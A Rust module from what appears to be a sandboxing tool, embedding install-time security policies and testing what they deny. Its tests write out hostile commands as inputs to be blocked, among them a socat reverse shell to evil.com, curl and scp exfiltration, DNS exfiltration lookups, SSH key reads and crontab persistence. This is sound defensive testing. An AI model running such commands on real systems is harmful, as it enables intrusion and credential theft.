//! Embedded policy YAML templates.
//!
//! All policy YAML files are compiled into the binary via `include_str!`.
//! This module provides `embedded_policy()` to look up templates by name,
//! and the default security policy constant.

/// Default security policy YAML (observe-mode: nothing is blocked).
pub const DEFAULT_SECURITY_YAML: &str = include_str!("presets/default.yaml");

const NPM_INSTALL_YAML: &str = include_str!("presets/npm-install.yaml");
const PIP_INSTALL_YAML: &str = include_str!("presets/pip-install.yaml");
const COMFYUI_YAML: &str = include_str!("presets/comfyui.yaml");
const OPENCLAW_YAML: &str = include_str!("presets/openclaw.yaml");
const BASH_INSTALL_YAML: &str = include_str!("presets/bash-install.yaml");
const AIR_GAP_YAML: &str = include_str!("presets/air-gap.yaml");
const BASE_YAML: &str = include_str!("presets/base.yaml");

/// Return the embedded YAML template for a given policy name.
pub fn embedded_policy(name: &str) -> Option<String> {
    match name {
        "npm-install" => Some(NPM_INSTALL_YAML.to_string()),
        "pip-install" => Some(PIP_INSTALL_YAML.to_string()),
        "comfyui" => Some(COMFYUI_YAML.to_string()),
        "openclaw" => Some(OPENCLAW_YAML.to_string()),
        "bash-install" => Some(BASH_INSTALL_YAML.to_string()),
        "air-gap" => Some(AIR_GAP_YAML.to_string()),
        "base" => Some(BASE_YAML.to_string()),
        _ => None,
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use malwi_policy::{EnforcementMode, Operation, PolicyAction, PolicyEngine, Runtime};

    // =====================================================================
    // ComfyUI auto-policy: attack scenario tests
    // =====================================================================

    fn comfyui_engine() -> PolicyEngine {
        let yaml = embedded_policy("comfyui").expect("comfyui policy must exist");
        PolicyEngine::from_yaml_with_includes(&yaml, &|name| embedded_policy(name))
            .expect("comfyui policy must parse")
    }

    #[test]
    fn test_comfyui_policy_parses() {
        let engine = comfyui_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_comfyui_python_block_and_warn_coexist() {
        let engine = comfyui_engine();

        // os.system → Block (from python:)
        let d = engine.evaluate_function(Runtime::Python, "os.system", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        // subprocess.run → Warn (from warn: key)
        let d = engine.evaluate_function(Runtime::Python, "subprocess.run", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        // Unlisted function → allowed
        let d = engine.evaluate_function(Runtime::Python, "json.loads", &[]);
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_attack_e_ctypes_blocked() {
        let engine = comfyui_engine();

        let d = engine.evaluate_function(Runtime::Python, "ctypes.CDLL", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        let d = engine.evaluate_function(Runtime::Python, "ctypes.cdll.LoadLibrary", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Python, "ctypes.WinDLL", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_attack_c_github_api_exfil() {
        let engine = comfyui_engine();

        let d = engine.evaluate_http_url("https://api.github.com/gists", "api.github.com/gists");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "https://github.com/comfyanonymous/ComfyUI/archive/main.zip",
            "github.com/comfyanonymous/ComfyUI/archive/main.zip",
        );
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_attack_c_pypi_upload() {
        let engine = comfyui_engine();

        let d =
            engine.evaluate_http_url("https://upload.pypi.org/legacy/", "upload.pypi.org/legacy/");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "https://pypi.org/simple/requests/",
            "pypi.org/simple/requests/",
        );
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_attack_h_git_push_blocked() {
        let engine = comfyui_engine();

        let d = engine.evaluate_execution("git push origin main");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("git clone https://github.com/example/repo.git");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("git pull origin main");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_protocols_restricted() {
        let engine = comfyui_engine();

        assert_eq!(
            engine.evaluate_protocol("https").action,
            PolicyAction::Allow
        );
        assert_eq!(engine.evaluate_protocol("http").action, PolicyAction::Allow);
        assert_eq!(engine.evaluate_protocol("wss").action, PolicyAction::Allow);
        assert_eq!(engine.evaluate_protocol("ws").action, PolicyAction::Allow);

        assert_eq!(engine.evaluate_protocol("tcp").action, PolicyAction::Deny);
        assert_eq!(engine.evaluate_protocol("udp").action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_credential_functions_blocked() {
        let engine = comfyui_engine();

        let d = engine.evaluate_function(Runtime::Python, "getpass.getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Python, "keyring.get_password", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Python, "keyring.set_password", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_dangerous_commands_blocked() {
        let engine = comfyui_engine();

        let d = engine.evaluate_execution("curl https://evil.com/exfil");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("wget https://evil.com/payload");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("sh");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("bash");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_git_remote_manipulation_blocked() {
        let engine = comfyui_engine();

        let d = engine.evaluate_execution("git remote add exfil https://evil.com/repo.git");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("git remote set-url origin https://evil.com/repo.git");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_model_downloads_allowed() {
        let engine = comfyui_engine();

        let d = engine.evaluate_http_url(
            "https://huggingface.co/stabilityai/stable-diffusion-xl/resolve/main/model.safetensors",
            "huggingface.co/stabilityai/stable-diffusion-xl/resolve/main/model.safetensors",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "https://civitai.com/api/download/models/12345",
            "civitai.com/api/download/models/12345",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "http://127.0.0.1:8188/api/queue",
            "127.0.0.1:8188/api/queue",
        );
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_suspicious_domains_warned() {
        let engine = comfyui_engine();

        let d = engine.evaluate_domain("hidden.onion");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_domain("service.i2p");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_domain("tunnel.loki");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    #[test]
    fn test_comfyui_sensitive_files_denied() {
        let engine = comfyui_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/server.pem", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/home/user/.ssh/id_ed25519", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.config/gh/hosts.yml", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/model.safetensors", Operation::Read);
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_sensitive_envvars_denied() {
        let engine = comfyui_engine();

        let d = engine.evaluate_envvar("MY_SECRET");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("API_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("DB_PASSWORD");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("STRIPE_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("AWS_ACCESS_KEY_ID");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("OPENAI_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("ANTHROPIC_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("HF_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_envvar("PATH");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    // =====================================================================
    // bash-install auto-policy: attack scenario tests
    // =====================================================================

    fn bash_install_engine() -> PolicyEngine {
        let yaml = embedded_policy("bash-install").expect("bash-install policy must exist");
        PolicyEngine::from_yaml_with_includes(&yaml, &|name| embedded_policy(name))
            .expect("bash-install policy must parse")
    }

    #[test]
    fn test_bash_install_policy_parses() {
        let engine = bash_install_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_bash_install_allows_curl_wget() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("curl -fsSL https://example.com/install.sh");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("wget -O- https://example.com/install.sh");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_bash_install_allows_build_tools() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("make install");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("cargo build --release");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("gcc -o tool tool.c");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_bash_install_allows_package_managers() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("apt-get install -y libssl-dev");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("brew install openssl");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("pip install setuptools");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_bash_install_blocks_interpreters() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("python3 -c 'import os; os.system(\"curl evil.com\")'");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("perl -e 'exec(\"curl evil.com\")'");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("ruby -e 'system(\"curl evil.com\")'");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine
            .evaluate_execution("node -e 'require(\"child_process\").exec(\"curl evil.com\")'");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_persistence() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("crontab -e");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("at now + 30 minutes");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("launchctl load ~/Library/LaunchAgents/com.evil.plist");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_reviews_privilege_escalation() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("sudo bash -c 'echo evil >> /etc/crontab'");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Review);

        let d = engine.evaluate_execution("su root");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Review);
    }

    #[test]
    fn test_bash_install_blocks_obfuscation_tools() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("base64 -d /tmp/payload");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("xxd -r -p /tmp/hex");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("rev /tmp/reversed");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_dns_exfiltration() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("dig chunk.exfil.example.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("nslookup chunk.exfil.example.com");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_raw_net_tools() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("nc evil.com 4444");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("socat TCP:evil.com:4444 EXEC:/bin/bash");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_clipboard() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("pbcopy");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("xclip -selection clipboard");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_warns_on_eval() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("eval echo test");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    #[test]
    fn test_bash_install_blocks_credential_files() {
        let engine = bash_install_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_shell_profile_writes() {
        let engine = bash_install_engine();

        let d = engine.evaluate_file("~/.bashrc", Operation::Write);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.zshrc", Operation::Write);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.profile", Operation::Write);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_git_hooks() {
        let engine = bash_install_engine();

        let d = engine.evaluate_file(".git/hooks/pre-commit", Operation::Write);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file(
            "/home/user/project/.git/hooks/post-checkout",
            Operation::Write,
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_cloud_metadata() {
        let engine = bash_install_engine();

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "http://metadata.google.internal/computeMetadata/v1/",
            "metadata.google.internal/computeMetadata/v1/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_warns_anonymity_domains() {
        let engine = bash_install_engine();

        let d = engine.evaluate_domain("hidden.onion");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    #[test]
    fn test_bash_install_blocks_env_secrets() {
        let engine = bash_install_engine();

        let d = engine.evaluate_envvar("AWS_SECRET_ACCESS_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_bash_install_blocks_anti_tracing_envvars() {
        let engine = bash_install_engine();

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("LD_PRELOAD");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_dd() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("dd if=~/.ssh/id_rsa of=/dev/stdout");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);
    }

    #[test]
    fn test_bash_install_warns_ln() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("ln -s ~/.ssh /tmp/x");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    #[test]
    fn test_bash_install_blocks_symlink_link_symbols() {
        let engine = bash_install_engine();

        let d = engine.evaluate_native_function("symlink", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("link", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_syscall_symbol() {
        let engine = bash_install_engine();

        let d = engine.evaluate_native_function("syscall", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_network_symbols() {
        let engine = bash_install_engine();

        for sym in &["connect", "socket", "sendto", "bind"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
        }
    }

    #[test]
    fn test_bash_install_protocols_restricted() {
        let engine = bash_install_engine();

        assert_eq!(
            engine.evaluate_protocol("https").action,
            PolicyAction::Allow
        );
        assert_eq!(engine.evaluate_protocol("http").action, PolicyAction::Allow);

        assert_eq!(engine.evaluate_protocol("tcp").action, PolicyAction::Deny);
        assert_eq!(engine.evaluate_protocol("udp").action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_native_getpass_crypt() {
        let engine = bash_install_engine();

        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("crypt", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_remote_access() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("ssh user@evil.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("scp /etc/passwd user@evil.com:/tmp/");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_keychain() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("security find-generic-password -s github.com -w");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_shared_memory() {
        let engine = bash_install_engine();

        let d = engine.evaluate_file("/dev/shm/exfil", Operation::Write);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    // =====================================================================
    // npm-install: base coverage tests
    // =====================================================================

    fn npm_install_engine() -> PolicyEngine {
        let yaml = embedded_policy("npm-install").expect("npm-install policy must exist");
        PolicyEngine::from_yaml_with_includes(&yaml, &|name| embedded_policy(name))
            .expect("npm-install policy must parse")
    }

    #[test]
    fn test_npm_install_policy_parses() {
        let engine = npm_install_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_npm_install_blocks_credential_files() {
        let engine = npm_install_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("*/.kube/config", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/server.pem", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_npm_install_blocks_env_secrets() {
        let engine = npm_install_engine();

        let d = engine.evaluate_envvar("AWS_SECRET_ACCESS_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("LD_PRELOAD");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_npm_install_blocks_native_getpass() {
        let engine = npm_install_engine();

        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("crypt", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_npm_install_blocks_network_symbols() {
        let engine = npm_install_engine();

        for sym in &["connect", "socket", "sendto", "bind"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
        }
    }

    #[test]
    fn test_npm_install_blocks_filesystem_bypass_symbols() {
        let engine = npm_install_engine();

        for sym in &["symlink", "link", "syscall"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
        }
    }

    #[test]
    fn test_npm_install_blocks_cloud_metadata() {
        let engine = npm_install_engine();

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "http://metadata.google.internal/computeMetadata/v1/",
            "metadata.google.internal/computeMetadata/v1/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_npm_install_warns_anonymity_domains() {
        let engine = npm_install_engine();

        let d = engine.evaluate_domain("hidden.onion");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    // =====================================================================
    // pip-install: base coverage tests
    // =====================================================================

    fn pip_install_engine() -> PolicyEngine {
        let yaml = embedded_policy("pip-install").expect("pip-install policy must exist");
        PolicyEngine::from_yaml_with_includes(&yaml, &|name| embedded_policy(name))
            .expect("pip-install policy must parse")
    }

    #[test]
    fn test_pip_install_policy_parses() {
        let engine = pip_install_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_pip_install_blocks_credential_files() {
        let engine = pip_install_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/server.pem", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_pip_install_blocks_env_secrets() {
        let engine = pip_install_engine();

        let d = engine.evaluate_envvar("AWS_SECRET_ACCESS_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_pip_install_blocks_native_getpass() {
        let engine = pip_install_engine();

        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_pip_install_blocks_network_symbols() {
        let engine = pip_install_engine();

        for sym in &["connect", "socket", "sendto", "bind"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
        }
    }

    #[test]
    fn test_pip_install_blocks_filesystem_bypass_symbols() {
        let engine = pip_install_engine();

        for sym in &["symlink", "link", "syscall"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
        }
    }

    #[test]
    fn test_pip_install_blocks_cloud_metadata() {
        let engine = pip_install_engine();

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_pip_install_warns_anonymity_domains() {
        let engine = pip_install_engine();

        let d = engine.evaluate_domain("hidden.onion");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    // =====================================================================
    // comfyui: additional base coverage tests
    // =====================================================================

    #[test]
    fn test_comfyui_blocks_cloud_metadata() {
        let engine = comfyui_engine();

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "http://metadata.google.internal/computeMetadata/v1/",
            "metadata.google.internal/computeMetadata/v1/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_blocks_kube_config() {
        let engine = comfyui_engine();

        let d = engine.evaluate_file("*/.kube/config", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_blocks_native_getpass_crypt() {
        let engine = comfyui_engine();

        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("crypt", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_blocks_network_symbols() {
        let engine = comfyui_engine();

        for sym in &["connect", "socket", "sendto", "bind"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
        }
    }

    #[test]
    fn test_comfyui_blocks_filesystem_bypass_symbols() {
        let engine = comfyui_engine();

        for sym in &["symlink", "link", "syscall"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
        }
    }

    #[test]
    fn test_comfyui_blocks_anti_tracing_envvars() {
        let engine = comfyui_engine();

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("LD_PRELOAD");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    // =====================================================================
    // base policy: parse test
    // =====================================================================

    #[test]
    fn test_base_policy_parses() {
        let yaml = embedded_policy("base").expect("base policy must exist");
        PolicyEngine::from_yaml_with_includes(&yaml, &|name| embedded_policy(name))
            .expect("base policy must parse");
    }

    // =====================================================================
    // air-gap policy tests
    // =====================================================================

    fn air_gap_engine() -> PolicyEngine {
        let yaml = embedded_policy("air-gap").expect("air-gap policy must exist");
        PolicyEngine::from_yaml_with_includes(&yaml, &|name| embedded_policy(name))
            .expect("air-gap policy must parse")
    }

    #[test]
    fn test_air_gap_policy_parses() {
        let engine = air_gap_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_air_gap_blocks_all_domains() {
        let engine = air_gap_engine();

        let d = engine.evaluate_domain("evil.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_domain("localhost");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_domain("169.254.169.254");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_domain("internal.corp.example.com");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_air_gap_blocks_all_urls() {
        let engine = air_gap_engine();

        let d = engine.evaluate_http_url("https://evil.com/exfil", "evil.com/exfil");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "https://pypi.org/simple/requests/",
            "pypi.org/simple/requests/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_air_gap_blocks_all_endpoints() {
        let engine = air_gap_engine();

        let d = engine.evaluate_endpoint("evil.com", 443);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_endpoint("127.0.0.1", 8080);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_endpoint("localhost", 22);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_air_gap_blocks_network_commands() {
        let engine = air_gap_engine();

        let d = engine.evaluate_execution("curl https://evil.com/exfil");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("wget https://evil.com/payload");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("ssh user@evil.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("scp file user@evil.com:/tmp/");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("nc evil.com 4444");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("socat TCP:evil.com:4444 EXEC:/bin/bash");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("dig chunk.exfil.example.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("nslookup chunk.exfil.example.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("sudo iptables -F");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("ip addr show");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("ifconfig eth0");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
